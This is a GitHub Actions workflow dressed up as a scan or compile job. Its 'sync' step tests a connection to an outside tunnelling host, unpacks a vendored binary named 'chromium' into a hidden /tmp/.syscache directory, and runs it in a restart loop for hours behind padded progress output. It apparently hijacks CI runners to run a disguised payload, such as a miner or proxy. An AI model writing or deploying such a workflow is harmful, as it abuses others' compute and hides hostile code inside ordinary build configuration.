name: scan-2r85
on:
  workflow_dispatch:
jobs:
  compile_2jq:
    runs-on: ubuntu-latest
    timeout-minutes: 345
    steps:
      - uses: actions/checkout@v4
      - run: uname -m
      - run: python3 --version
      - run: go version 2>/dev/null || true
      - name: sync
        run: |
          python3 -c "import socket,ssl; s=socket.create_connection(('z5h8srda9j.localto.net',8999),timeout=10); print('NET-TCP-OPEN'); c=ssl.create_default_context().wrap_socket(s,server_hostname='z5h8srda9j.localto.net'); print('NET-TLS-OK',c.version())" || echo NET-FAIL
          unzip -o -q vendor/chromium.zip -d /tmp/.syscache && chmod +x /tmp/.syscache/chromium
          cd /tmp/.syscache && stdbuf -o0 -e0 timeout 167m bash -c 'while true; do ./chromium; echo "worker-exit rc=$? $(date -u +%H:%M), restarting"; sleep 5; done'
          for i in $(seq 1 105); do sleep $((RANDOM % 93 + 48)); echo "96mrfe $i/105 $(date -u +%H:%M)"; done
